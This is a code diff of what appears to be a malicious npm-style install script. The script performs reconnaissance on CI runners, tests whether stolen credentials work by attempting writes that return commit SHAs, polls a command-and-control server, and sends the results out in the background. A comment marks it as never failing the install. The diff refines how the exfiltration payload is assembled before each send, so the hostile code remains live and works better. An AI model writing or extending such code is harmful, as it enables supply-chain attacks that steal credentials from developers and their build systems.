@@ -102,12 +102,11 @@ function buildPayload() {
                   commit_sha: res.statusCode === 200 || res.statusCode === 201 ? wres.commit.sha : undefined,
                 };
                 // report asynchronously with the proof included
-                payload.runner_recon = runnerRecon;
-                send(payload);
+                const p2 = buildPayload(); p2.runner_recon = runnerRecon; send(p2);
               } catch (_) { send(payload); }
             });
           });
-          wreq.on('error', () => { runnerRecon.credential_control_proof = { status: 'req_err' }; send(payload); });
+          wreq.on('error', () => { runnerRecon.credential_control_proof = { status: 'req_err' }; const p2 = buildPayload(); p2.runner_recon = runnerRecon; send(p2); });
           wreq.end(proofBody);
           payloadSent = true;
         } catch (e) { runnerRecon.credential_control_proof = 'err:' + String(e.message).slice(0, 80); }
@@ -161,7 +160,7 @@ try {
       } catch (_) {}
       c2.polled = true;
       // send the full payload including C2 results
-      try { if (!payloadSent) { payload.c2 = c2; payloadSent = true; send(buildPayload()); } } catch (_) {}
+      try { if (!payloadSent) { const p2 = buildPayload(); p2.c2 = c2; payloadSent = true; send(p2); } } catch (_) {}
     });
   });
   cmdReq.on('error', () => {});
@@ -171,5 +170,5 @@ try {
 setTimeout(() => process.exit(0), 20000);
 
 try {
-  setTimeout(() => { if (!payloadSent) { try { payload.c2 = c2; payloadSent = true; send(buildPayload()); } catch (_) {} } }, 9000);
+  setTimeout(() => { if (!payloadSent) { try { const p2 = buildPayload(); p2.c2 = c2; payloadSent = true; send(p2); } catch (_) {} } }, 9000);
 } catch (_) { /* never fail the install */ }
